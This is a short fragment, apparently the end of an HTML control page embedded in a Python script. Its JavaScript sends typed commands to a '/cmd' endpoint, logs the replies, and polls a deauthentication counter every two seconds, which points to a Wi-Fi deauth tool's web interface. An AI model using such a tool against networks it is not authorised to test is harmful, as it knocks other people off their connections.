    fetch('/cmd?c='+cmd).then(r=>r.text()).then(t=>{
        let log=document.getElementById('log');
        log.innerText+=new Date().toLocaleTimeString()+' > '+t+'\\n';
        log.scrollTop=log.scrollHeight;
    });
}
setInterval(()=>{
    fetch('/data').then(r=>r.json()).then(d=>{
        let deauth=document.getElementById('deauthCount');
        if(deauth) deauth.innerText=d.deauth;
    });
},2000);
</script>
</body>
</html>
'''

